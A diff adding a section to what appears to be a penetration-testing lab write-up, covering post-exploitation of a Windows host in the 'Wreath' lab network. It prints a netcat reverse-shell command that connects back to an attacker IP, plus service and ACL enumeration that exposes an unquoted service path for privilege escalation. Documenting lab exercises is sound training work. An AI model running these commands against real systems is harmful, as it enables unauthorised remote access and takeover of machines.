@@ -253,4 +253,40 @@ After exiftool to embed the payload into the image, uploading it and navigating 
 
 ## Personal Pc Exploitation
 
+The next step involved obtaining a full reverse shell from the web shell.
+I uploaded a static netcat binary (https://github.com/int0x33/nc.exe/) to the server via a local python webserver and uesd powershell to set up the connection:
+
+` powershell.exe c:\\windows\\temp\\nc-USERNAME.exe 10.10.146.80 12345 -e cmd.exe `
+
+After gaining access and manually exploring the target, it became clear there was a potential Unquoted Service Path vulnerability in the ` SystemExplorerHelpService` service and I also had full read & write permissions to the directory:
+```
+C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
+sc qc SystemExplorerHelpService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: SystemExplorerHelpService
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : System Explorer Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+
+
+Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
+Owner  : BUILTIN\Administrators
+Group  : WREATH-PC\None
+Access : BUILTIN\Users Allow  FullControl
+         NT SERVICE\TrustedInstaller Allow  FullControl
+         NT SERVICE\TrustedInstaller Allow  268435456
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  268435456
+         BUILTIN\Administrators Allow  FullControl
+```
+
 
